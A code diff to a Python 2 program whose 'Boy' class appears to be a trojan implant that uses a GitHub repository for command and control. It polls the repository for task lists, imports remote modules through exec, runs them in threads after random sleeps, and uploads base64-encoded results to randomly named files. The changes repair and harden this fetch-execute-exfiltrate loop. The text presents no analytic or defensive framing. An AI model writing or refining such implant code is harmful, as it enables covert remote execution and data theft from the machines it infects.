@@ -41,9 +41,9 @@ class Boy(object):
         return gh, repo, branch
 
     @staticmethod
-    def save_result(self, repo, path, data, msg='new result'):
-        remote_path = path + '%d.data' % random.randint(1000, 100000)
-        repo.create_file(remote_path, msg, base64.b64encode(data))
+    def save_result(repo, path, data, msg='new result'):
+        # remote_path = path + '%d.data' % random.randint(1000, 100000)
+        repo.create_file(path, msg, base64.b64encode(data))
         return
 
     @staticmethod
@@ -67,16 +67,20 @@ class Boy(object):
         for pkg, url in self.base_modules.items():
             try:
                 add_remote_repo([pkg], url)
-                # __import__(pkg)
                 print 'Try to import %s' % pkg
                 exec "import %s" % pkg
             except Exception:
                 print 'exception with %s' % pkg
                 pass
-        return
         # for m in self.run_modules:
         #     try:
         #         exec "from toy.modules import %s" % m
+        #         mod = 'toy.modules.%s' % m
+        #         t = threading.Thread(
+        #             target=self.worker, args=(mod,))
+        #         t.start()
+        #         time.sleep(random.randint(1, 10))
+        #         # m.run()
         #     except Exception:
         #         print 'exception with %s' % m
         #         pass
@@ -109,11 +113,15 @@ class Boy(object):
     def dec(data):
         pass
 
-    def worker(self, m):
+    def worker(self, m, loop=False):
+        path = self.result_path + '%d.data' % random.randint(
+            1000, 100000)
         self.task_queue.put(1)
         result = sys.modules[m].run()
         self.task_queue.get()
-        self.save_result(self.repo, self.result_path, result)
+        self.save_result(self.repo, path, result)
+        if not loop:
+            del sys.modules[m]
         return
 
     def run(self):
@@ -123,10 +131,14 @@ class Boy(object):
                 tasks = self.get_task(self.task_url + self._id + '.json')
                 for task in tasks:
                     print "run task %s" % task['module']
-                    t = threading.Thread(
-                        target=self.worker, args=(task['module'],))
-                    t.start()
-                    time.sleep(random.randint(1, 10))
+                    mod = 'toy.modules.%s' % task['module']
+                    try:
+                        t = threading.Thread(
+                            target=self.worker, args=(mod,))
+                        t.start()
+                        time.sleep(random.randint(1, 10))
+                    except Exception:
+                        print 'run exception'
+                        pass
             time.sleep(self.cf)
             # time.sleep(random.randint(1000, 10000))
-
